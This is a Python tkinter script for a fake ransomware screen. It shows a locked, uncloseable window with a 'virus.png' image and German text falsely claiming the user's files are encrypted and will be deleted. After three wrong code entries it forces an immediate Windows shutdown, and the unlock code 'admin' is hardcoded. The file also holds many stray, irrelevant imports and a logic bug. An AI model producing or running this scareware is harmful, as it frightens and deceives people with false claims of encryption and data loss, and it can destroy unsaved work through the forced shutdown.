from cgi import test
from cgitb import text
from distutils import command
from email.mime import image
import imp
from ast import If
from msilib.schema import File
from multiprocessing import parent_process
import string
from tkinter import *
import tkinter as tk
import tkinter
from tokenize import String
import os
from turtle import left, right, width
from PIL import ImageTk, Image



hiddenpasswd = 'admin'
count = 3

mainWin = tk.Tk()
mainWin.overrideredirect(1)
mainWin.geometry('1250x1100')
mainWin.configure(bg='black')

# mainWin.geometry('625x610')


img = ImageTk.PhotoImage(Image.open("virus.png"))


result = StringVar()
result.set('Daten wurden verschlüsselt. Code zum Entschlüsseln eingeben')
label_1 = tk.Label(mainWin, bg='black', fg='red', image=img, textvariable=result, compound=TOP)
label_1.grid()
label_1.focus()



password = StringVar()
entry_1 = tk.Entry(mainWin, textvariable=password, width=20, show='*')
entry_1.grid()
entry_1.focus()



def clicked(): # without event because I use `command=` instead of `bind`
    global count
    count = count - 1
    label1.configure(text=f'Verbleibende Versuche bevor Datenlöschung: {count}')

    if (count == 0):
        os.system("shutdown /s /t 1")




def check_passwd():
    passwd = entry_1.get()
    if (passwd == 'admin'):
        mainWin.destroy()



def on_closing():
    print('Lol u cant close me')
    pass


label1 = tk.Label(mainWin, bg='black', fg='red')
label1.grid()

schaltf1 = tk.Button(mainWin, text="Entschlüsseln", command=lambda:[check_passwd(), clicked()], bg='black', fg='red')
schaltf1.grid()





mainWin.protocol("WM_DELETE_WINDOW", on_closing)
mainWin.mainloop()